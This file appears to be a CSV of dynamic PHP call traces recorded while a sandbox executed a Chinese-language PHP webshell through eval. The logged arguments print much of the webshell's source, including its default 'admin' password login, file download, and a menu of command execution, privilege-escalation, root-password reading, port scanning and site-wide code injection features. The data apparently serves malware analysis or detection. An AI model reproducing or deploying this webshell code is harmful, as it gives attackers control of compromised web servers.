uuid,file_md5,index,source,target,argc,argv,return,dynamic
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,10,__lambda_func,eval,1,"{""value"": [[0, ""phpcode"", ""ob_start();\r\ndefine('myaddress',$_SERVER['SCRIPT_FILENAME']);\r\ndefine('envlpass',$password);\r\ndefine('shellname',$shellname);\r\ndef""]]}",{"value": null},[0]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,11,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""ob_start();\r\ndefine('myaddress',$_SERVER['SCRIPT_FILENAME']);\r\ndefine('envlpass',$password);\r\ndefine('shellname',$shellname);\r\ndefine('myurl',$myurl);\r\nif(@get_magic_quotes_gpc()){\r\n\tforeach($_POST as $k => $v) $_POST[$k] = stripslashes($v);\r\n\tforeach($_GET as $k => $v) $_GET[$k] = stripslashes($v);\r\n}\r\nif(isset($_REQUEST[envlpass])){\r\nhmlogin(2);\r\nexit;}\r\n\t if($_COOKIE['envlpass'] != md5(envlpass)){\r\n\tif($_POST['envlpass']){\r\n\t\tif($_POST['envlpass'] == envlpass){\r\n\t\t\tsetcookie('envlpass',md5($_POST['envlpass']));\r\n\t\t\tcss_main();\r\n\t\t\thmlogin();\r\n\t\t\tdie;\r\n\t\t}else{\r\n\t\t\techo '<CENTER>\\xd3\\xc3\\xbb\\xa7\\xbb\\xf2\\xc3\\xdc\\xc2\\xeb\\xb4\\xed\\xce\\xf3</CENTER>';\r\n\t\t\t\r\n\t\t}\r\n\t}\r\n\tislogin($shellname,$myurl);\r\n\texit;\r\n\t\r\n}\r\n\r\n/*---End Login---*/\r\nif(isset($_GET['down'])) do_down($_GET['down']);\r\nif(isset($_GET['pack'])){\r\n\t$dir = do_show($_GET['pack']);\r\n\t$zip = new eanver($dir);\r\n\t$out = $zip->out;\r\n\tdo_download($out,\""eanver.tar.gz\"");\r\n}\r\nif(isset($_GET['unzip'])){\r\n\tcss_main();\r\n\tstart_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);\r\n\texit;\r\n}\r\n\r\ndefine('root_dir',str_replace('\\\\','/',dirname(myaddress)).'/');\r\ndefine('run_win',substr(PHP_OS, 0, 3) == \""WIN\"");\r\ndefine('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));\r\n$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : \""\"";\r\n$doing = isset($_POST['doing']) ? $_POST['doing'] : \""\"";\r\n$path = isset($_GET['path']) ? $_GET['path'] : root_dir;\r\n$name = isset($_POST['name']) ? $_POST['name'] : \""\"";\r\n$img = isset($_GET['img']) ? $_GET['img'] : \""\"";\r\n$p = isset($_GET['p']) ? $_GET['p'] : \""\"";\r\n$pp = urlencode(dirname($p));\r\nif($img) css_img($img);\r\nif($eanver == \""phpinfo\"") die(phpinfo());\r\nif($eanver == 'logout'){\r\n\tsetcookie('envlpass',null);\r\n\tdie('<meta http-equiv=\""refresh\"" content=\""0;URL=?\"">');\r\n}\r\n\r\n$class = array(\r\n\""\\xd0\\xc5\\xcf\\xa2\\xb2\\xd9\\xd7\\xf7\"" => array(\""upfiles\"" => \""\\xc9\\xcf\\xb4\\xab\\xce\\xc4\\xbc\\xfe\"",\""phpinfo\"" => \""\\xbb\\xf9\\xb1\\xbe\\xd0\\xc5\\xcf\\xa2\"",\""info_f\"" => \""\\xcf\\xb5\\xcd\\xb3\\xd0\\xc5\\xcf\\xa2\"",\""phpcode\"" => \""\\xd6\\xb4\\xd0\\xd0PHP\\xbd\\xc5\\xb1\\xbe\""),\r\n\""\\xcc\\xe1\\xc8\\xa8\\xb9\\xa4\\xbe\\xdf\"" => array(\""sqlshell\"" => \""\\xd6\\xb4\\xd0\\xd0SQL\\xd3\\xef\\xbe\\xe4\"",\""mysql_exec\"" => \""MYSQL\\xb9\\xdc\\xc0\\xed\"",\""othersql\"" => \""\\xc6\\xe4\\xcb\\xfb\\xca\\xfd\\xbe\\xdd\\xbf\\xe2\"",\""myexp\"" => \""MYSQL_UDF\\xcc\\xe1\\xc8\\xa8\"",\""winapi\"" => \""WIN API\\xcc\\xe1\\xc8\\xa8\"",\""mofshell\"" => \""Mof\\xcb\\xab\\xd6\\xd8\\xcc\\xe1\\xc8\\xa8\"",\""cmd\"" => \""\\xd6\\xb4\\xd0\\xd0CMD\\xc3\\xfc\\xc1\\xee\"",\""linux\"" => \""\\xb7\\xb4\\xb5\\xaf\\xcc\\xe1\\xc8\\xa8\"",\""servu\"" => \""Serv-U\\xcc\\xe1\\xc8\\xa8\"",\""readpass\"" => \""\\xb5\\xcd\\xc8\\xa8\\xcf\\xde\\xb6\\xc1root\\xc3\\xdc\\xc2\\xeb\"",\""downloader\"" => \""\\xce\\xc4\\xbc\\xfe\\xcf\\xc2\\xd4\\xd8\"",\""port\"" => \""\\xb6\\xcb\\xbf\\xda\\xc9\\xa8\\xc3\\xe8\""),\r\n\""\\xc5\\xfa\\xc1\\xbf\\xb2\\xd9\\xd7\\xf7\"" => array(\""guama\"" => \""\\xc5\\xfa\\xc1\\xbf\\xb9\\xd2\\xc2\\xed\\xc7\\xe5\\xc2\\xed\"",\""tihuan\"" => \""\\xc5\\xfa\\xc1\\xbf\\xcc\\xe6\\xbb\\xbb\\xc4\\xda\\xc8\\xdd\"",\""scanfile\"" => \""\\xc5\\xfa\\xc1\\xbf\\xcb\\xd1\\xcb\\xf7\\xce\\xc4\\xbc\\xfe\"",\""scanphp\"" => \""\\xc5\\xfa\\xc1\\xbf\\xb2\\xe9\\xd5\\xd2\\xc4\\xbe\\xc2\\xed\"",\""zippak\"" => \""zip\\xbd\\xe2\\xd1\\xb9\""),\r\n\""\\xbd\\xc5\\xb1\\xbe\\xb2\\xe5\\xbc\\xfe\"" => array(\""getcode\"" => \""\\xbb\\xf1\\xc8\\xa1\\xcd\\xf8\\xd2\\xb3\\xd4\\xb4\\xc2\\xeb\"")\r\n);\r\n$msg = array(\""0\"" => \""\\xb1\\xa3\\xb4\\xe6\\xb3\\xc9\\xb9\\xa6\"",\""1\"" => \""\\xb1\\xa3\\xb4\\xe6\\xca\\xa7\\xb0\\xdc\"",\""2\"" => \""\\xc9\\xcf\\xb4\\xab\\xb3\\xc9\\xb9\\xa6\"",\""3\"" => \""\\xc9\\xcf\\xb4\\xab\\xca\\xa7\\xb0\\xdc\"",\""4\"" => \""\\xd0\\xde\\xb8\\xc4\\xb3\\xc9\\xb9\\xa6\"",\""5\"" => \""\\xd0\\xde\\xb8\\xc4\\xca\\xa7\\xb0\\xdc\"",\""6\"" => \""\\xc9\\xbe\\xb3\\xfd\\xb3\\xc9\\xb9\\xa6\"",\""7\"" => \""\\xc9\\xbe\\xb3\\xfd\\xca\\xa7\\xb0\\xdc\"");\r\ncss_main();\r\nswitch($eanver){\r\n\tcase \""left\"":\r\n\tcss_left();\r\n\t\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items1');\\\"" target=\\\""_self\\\"">\"");\r\n\t\thtml_img(\""title\"");html_n(\"" \\xb1\\xbe\\xb5\\xd8\\xd3\\xb2\\xc5\\xcc</a></dt><dd id=\\\""items1\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n    $ROOT_DIR = File_Mode();\r\n\r\n\tfor ($i=66;$i<=90;$i++){$drive= chr($i).':';\r\n    if (is_dir($drive.\""/\"")){$vol=File_Str(\""vol $drive\"");if(empty($vol))$vol=$drive;\r\n    html_n(\""<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>\\xb1\\xbe\\xb5\\xd8\\xb4\\xc5\\xc5\\xcc($drive)</a></li>\"");}}\r\n    \thtml_n(\""<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>\\xcd\\xf8\\xd5\\xbe\\xb8\\xf9\\xc4\\xbf\\xc2\\xbc</a></li>\"");\r\n\thtml_n(\""<li><a href='?eanver=main' target='main'>\\xb1\\xbe\\xb3\\xcc\\xd0\\xf2\\xc4\\xbf\\xc2\\xbc</a></li>\"");\r\n\thtml_n(\""</ul></dd></dl>\"");\r\n\t$i = 2;\r\n\tforeach($class as $name => $array){\r\n\t\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items$i');\\\"" target=\\\""_self\\\"">\"");\r\n\t\thtml_img(\""title\"");html_n(\"" $name</a></dt><dd id=\\\""items$i\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n\t\tforeach($array as $url => $value){\r\n\t\t\thtml_n(\""<li><a href=\\\""?eanver=$url\\\"" target='main'>$value</a></li>\"");\r\n\t\t}\r\n\t\thtml_n(\""</ul></dd></dl>\"");\r\n\t\t$i++;\r\n\t}\r\n\thtml_n(\""<dl><dt><a href=\\\""#\\\"" onclick=\\\""showHide('items$i');\\\"" target=\\\""_self\\\"">\"");\r\n\thtml_img(\""title\"");html_n(\"" \\xc6\\xe4\\xcb\\xfc\\xb2\\xd9\\xd7\\xf7</a></dt><dd id=\\\""items$i\\\"" style=\\\""display:block;\\\""><ul>\"");\r\n\thtml_n(\""<li><a title='\\xb3\\xcc\\xd0\\xf2\\xb8\\xfc\\xd0\\xc2' href='http://www.web-shell.com/index.html' target=\\\""main\\\"">\\xb3\\xcc\\xd0\\xf2\\xb8\\xfc\\xd0\\xc2</a></li>\"");\r\n    html_n(\""<li><a title='\\xb0\\xb2\\xc8\\xab\\xcd\\xcb\\xb3\\xf6' href='?eanver=logout' target=\\\""main\\\"">\\xb0\\xb2\\xc8\\xab\\xcd\\xcb\\xb3\\xf6</a></li>\"");\r\n\thtml_n(\""<""]]}",{"value": "3C415051423C41423C41423C41423C393C3A2B504D4E892626423C5393892A31504D4E892626423C5393892A312A6359732B3B413D4F2A505163413C122B50512B505163112B415051423C6A3C3B3D3B3D4F2A282A3B42423D4F2A59732B3B5C5D423D2A59732B3B5C5D423D266D44423D2652263B42413D2A59732B3B3D3B5C5D425C5D425C5D423D4F2A41414163413C6A3C08413C414141413C11413C413B63505108413D6A3C59732B50519D2A9D2659732B50519D2A9D2659732B50519D2A639D2659732B50519D2A9D2659732B50519D2A9D2659732B50519D2A9D26423C6A3C262B3B423D2A112B3C4F2A112B41413C4F2A4748484847474848484848484848484848484748484848484748264748484848484848263B3D302B3B3D3B413D3B413D3B413D3B3D2626142D24462A423C082608413C2B3B3738413D26722B262A3B37383738373837413D2A2A3B3738373837413D3B413D3B413D264D4E8926263B373837413D3B413D3B3638373837413D4D4E8926263B3738373837413D2A313B413D24462A313B373837413D3B413D3B373837413D3B413D3B413D3B413D3B413D322A302B3B413D8D3950423C3A263B423C6A3D2659730D2B3B5C5D425C5D425C5D42423D0808282A262650510D2B262A50510808263B3D263B413D3B373837413D3B423C0808413D3B423C0808423C0808413D3B414141413D3B4141413D59730D2B59732B5051262A264141413C142B5051112F505111342B2A415051425051423C5393892A3B5C5D42425C5D423D2B505108085108162A505108085108162839505142395051423C3A6A3C3A2A3B0808413D3B3B423D0841413D3B413D3B413D3950703D3A262B112F11342B332A3B383638413D26423C2B3B423D08423C6A41413C6A413C082639413950423C3A6A3C3A26423C263B0808413D3B413D3B0841423D3B413D3B3738373837413D3B3738373837413D3B0841413D3B413D3B08080841423D3B0808413D3B413D24462A2A3950703D3A3950703D3A262B112F11342B332A3B383638413D26423C0D2B3950423C3A263B423D263B423D08423C6A41413C6A413C082639413950423C3A6A3C3A263B08413D6A42423C260826423C2642413C263B0808413D3B3B423D6A3D3B4242413D3B413D112F11342F11342F11342B3B084141080808080808413D2A3B0841410808413D3B3738373837413D3B423C0837383708413D3B3738373837413D3B084141410808413D3B413D3B08080841423D3B0808413D3B0841420808413D3B413D24462A2A3950703D3A0D2B413C0301413C262A373837383750513837383738372946322A302B3B413D59730D2B39505151423B0850515108413D6A3C3A2B3B41505151085108413D9D2A3B5D423D9D28423C08084F2A59730D2B5051263B0808413D26395042413C3A2B3B41085108413D9D2A3B5D423D9D46423C08084F2A59730D2B5051260808413C26423C263B0808413D262626413C0301413C263950423C3A2B282A2A423C2641423C6A3C263950423C3A264141413C142B59732B3B423D132B264141423C262A262A5051112B262A50512650514241423C262A423C263738373837383738373837383729463B47484848484848484142373837413D373837383738372946322A302B3B413D423C085051423C0826395042423C3A2B3B3738415051423C085108413D9D2A3B5D423D9D4608084F322A302B3B413D3B423D2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D3950423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B413D415051423C2651938926423C132D24462A51423C93892A41423C26395042423C3A2B3B373841085108413D9D2A3B5D423D9D4608084F322A302B3B0808413D423C2B3B474848415C5D423D2A3B474848415C5D423D3B4141413D3B3D50512B5051302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A302B395042413C3A26322A312B3B3738415D423D9D2A3B5D423D9D4608084F2A3B413D322A302B8D8D413C26413C2B413C9D2A9D2659732B5051080850510808162A413C0808413C08081626112B262A4141423C264141423C2641423C0D2B162A162647413C6A3C08413C0301413C084847475051080850510808505108085051423C080848484708505108084848475051484847413C4848473C6A3C0808083B413D084848474848474848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848474848473B413D08484847484847484847413C0304413C084848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D4848473B413D083B413D084848473B413D083B413D084848473B413D4848473B413D4848473B413D4848473B413D4848262826423C132D24462A515108085151080808282A6D44413D262F4F344670413D2670413D2670413D262A6B08080828080808280808082828322A302B262659730D2B3B5051423C6A3D265051423C6A3C262A37505138375051383729463B3D37383738372946322A302B59732B50519D2A413C9D2659732B50519D2A9D264141413C6A3C26373837294659730D2E59730D342B285051112B080808080808263B41423C6A413D2B162A16283B413D262B423C9D2A9D2639413C3A3B085051080850510808413D2B50510816"},[0]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,12,eval,ob_start,0,{"value": []},{"value": "void"},[]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,13,eval,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,14,eval,define,2,"{""value"": [[0, ""constant_name"", ""myaddress""], [1, ""value"", ""/usr/share/nginx/html/be191af40c3e65eb8fe339b59296801c_4a2e7443-69a3-49f5-9d95-2698e70af01f.php""]]}",{"value": "void"},"[0, 0]"
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,15,eval,define,2,"{""value"": [[0, ""constant_name"", ""envlpass""], [1, ""value"", ""admin""]]}",{"value": "void"},"[0, 0]"
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,16,eval,define,2,"{""value"": [[0, ""constant_name"", ""shellname""], [1, ""value"", ""\\xd1\\xbe\\xd1\\xbe""]]}",{"value": "void"},"[0, 0]"
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,17,eval,define,2,"{""value"": [[0, ""constant_name"", ""myurl""], [1, ""value"", """"]]}",{"value": "void"},"[0, 0]"
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,18,eval,get_magic_quotes_gpc,0,{"value": []},{"value": false},[]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,19,eval,zend_fetch_r_cookie,1,"{""value"": [[0, ""op1"", ""_COOKIE""]]}",{"value": []},[0]
64be9ee12237dbd9d9d92268b4936406,be191af40c3e65eb8fe339b59296801c,20,eval,md5,1,"{""value"": [[0, ""str"", ""admin""]]}",{"value": "21232f297a57a5a743894a0e4a801fc3"},[0]
